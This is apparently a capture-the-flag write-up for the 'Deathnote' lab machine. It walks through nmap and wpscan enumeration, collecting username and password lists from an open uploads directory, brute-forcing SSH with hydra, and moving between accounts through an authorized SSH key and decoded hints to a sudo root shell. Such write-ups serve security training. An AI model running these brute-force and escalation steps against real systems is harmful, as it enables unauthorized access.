# **Deathnote - ThunderCipher**

*Target Ip. Address: 192.168.5.165*

So, let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.165
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 20:59 +0545
Nmap scan report for 192.168.5.165
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

So, standard 2 ports. Port 22 (ssh) and Port 80 (http).

So, going to website it redirects to deathnote.vuln. Let's add it to our hosts file.

```bash
kali@kali:cat /etc/hosts
192.168.5.165   deathnote.vuln

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

So, this is a wordpress website. We are given the hint.

```hint
Find a notes.txt file on server
or
SEE the L comment 
```

L's comment
```comment
my fav line is iamjustic3
```

We find robots.txt, and it gives another hint.

```hint
fuck it my dad 
added hint on /important.jpg

ryuk please delete it
```

Going, to /important.jpg, it shows error. Let's download it and see what it is.

```bash
kali@kali:curl http://deathnote.vuln/important.jpg > important.jpg
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    277 100    277   0      0   1790      0                              0

kali@kali:file important.jpg
important.jpg: ASCII text
```

It is ASCII, we can read it.

```bash
kali@kali:cat important.jpg
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site
```

Since, this is wordpress, let's do wpscan too.

```bash
kali@kali:wpscan --url http://deathnote.vuln/wordpress --enumerate vp --api-token=75e.....HahVVVc --no-update
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://deathnote.vuln/wordpress/ [192.168.5.165]
[+] Started: Tue Feb 10 21:07:42 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://deathnote.vuln/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://deathnote.vuln/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
```

So, we have directory listing at *http://deathnote.vuln/wordpress/wp-content/uploads/*

We can go there and find user.txt and pass.txt.

The user.txt has list of usernames and notes.txt has list of passwords.

Let's see if we can get valid credentials.

```bash
kali@kali:hydra -L user.txt -P notes.txt ssh://192.168.5.165
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-10 21:28:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43), ~46 tries per task
[DATA] attacking ssh://192.168.5.165:22/
[STATUS] 251.00 tries/min, 251 tries in 00:01h, 481 to do in 00:02h, 15 active
[22][ssh] host: 192.168.5.165   login: l   password: d...e
[STATUS] 252.50 tries/min, 505 tries in 00:02h, 227 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-10 21:31:37
```

So, we find a valid password for l. Let's login via ssh.

```bash
kali@kali:ssh L@192.168.5.165
The authenticity of host '192.168.5.165 (192.168.5.165)' can't be established.
ED25519 key fingerprint is: SHA256:Pj7G++7sat/zpoeFTsy5FUba1luVvaIo7NG0PdXzxY8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.165' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
l@192.168.5.165's password: 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec  1 09:03:27 2025 from 192.168.5.126
l@deathnote:~$
```

We find user flag at home directory.

```bash
l@deathnote:~$ cat user.txt
ThunderCipher{u5.....0l}
```

We can see that our private key is stored in kira's ssh directory.

```bash
l@deathnote:/home/kira/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote
```

We can simply ssh as kira.

```bash
l@deathnote:/home/kira/.ssh$ ssh kira@127.0.0.1
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec  1 08:58:04 2025 from 192.168.5.126
kira@deathnote:~$ 
```

Heading to kira's home directory, we get a hint.

```bash
kira@deathnote:~$ cat kira.txt 
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

Let's decode it.

```bash
kali@kali:echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 -d
please protect one of the following 
1. L (/opt)
2. Misa (/var)
```

We find another hint inside /opt/L...

```bash
kira@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
63 47 ..... 41 3d
```

Decoding it with cyberchef, we get a password of kira.

Let's see what sudo privileges kira has.

```bash
kira@deathnote:/opt/L/fake-notebook-rule$ sudo -l
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

So, basically everything. Let's switch to root.

```bash
kira@deathnote:~$ sudo su
root@deathnote:/home/kira# id
uid=0(root) gid=0(root) groups=0(root)
```

Let's head to root directory, grab the final flag and end this challenge.

```bash
root@deathnote:~# cat root.txt
ThunderCipher{r0.....0x}
```
